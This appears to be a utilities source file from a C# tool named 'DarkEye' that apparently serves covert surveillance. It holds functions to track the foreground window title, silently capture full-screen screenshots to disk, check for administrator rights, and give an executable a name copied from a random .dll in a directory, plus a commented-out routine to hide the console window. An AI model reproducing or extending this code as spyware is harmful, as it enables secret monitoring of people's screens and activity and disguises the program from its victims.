using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace DarkEye.Classes.Utils
{
    /*
    * Created by Gish_Reloaded on 27/03/2020.
    */
    class Utils
    {
        public static bool IsAdmin => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        public static bool IsWin64 => Environment.Is64BitOperatingSystem ? true : false;

        private static Random random = new Random();
        public static string GetRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                StringBuilder Buff = new StringBuilder(nChars);
                IntPtr handle = NativeMethods.GetForegroundWindow();

                if (NativeMethods.GetWindowText(handle, Buff, nChars) > 0)
                {
                    return Buff.ToString();
                }
            }
            catch (Exception ex)
            {
                WriteUtils.writeError("GetActiveWindowTitle: " + ex.Message);
            }
            return null;
        }

        public static String GetRandomFileNameFromDirectory(String dir)
        {
            String[] files = Array.FindAll(Directory.GetFiles(dir), s => s.EndsWith(".dll"));
            Random random = new Random();
            int c = random.Next(files.Length);
            return files[c].Replace(".dll", ".exe");
        }

        public static String GetThisName()
        {
            return Assembly.GetExecutingAssembly().GetName().FullName;
        }

        public static String GetThisPath()
        {
            return Path.GetDirectoryName(Assembly.GetEntryAssembly().Location + "//" + GetThisName());
        }

        public static bool CaptureScreen(String path)
        {
            try
            {
                WriteUtils.write("CaptureScreen: Capturing...");
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bitmap.Save(path, ImageFormat.Jpeg);
                    WriteUtils.write("CaptureScreen: Saved as " + path);
                    return true;
                }
            }
            catch (Exception ex)
            {
                WriteUtils.writeError("CaptureScreen: Capture Failed: " + ex.Message);
            }
            return false;
        }

        public static bool ContainsIgnoreCase(string source, string toCheck)
        {
            return source?.IndexOf(toCheck, StringComparison.OrdinalIgnoreCase) >= 0;
        }

        public static bool isWindowEquals(String windowName1, String windowName2)
        {
            if (ContainsIgnoreCase(windowName1, windowName2))
                return true;

            if (windowName1.Contains(" "))
                if (ContainsIgnoreCase(windowName1.Replace(" ", ""), windowName2))
                    return true;

            if (windowName2.Contains(" "))
                if (ContainsIgnoreCase(windowName1, windowName2.Replace(" ", "")))
                    return true;
            return false;
        }

        //public static void SetConsoleWindow(bool show)
        //{
        //    var handle = NativeMethods.GetConsoleWindow();
        //    NativeMethods.ShowWindow(handle, show ? 5 : 0);
        //}
    }
}
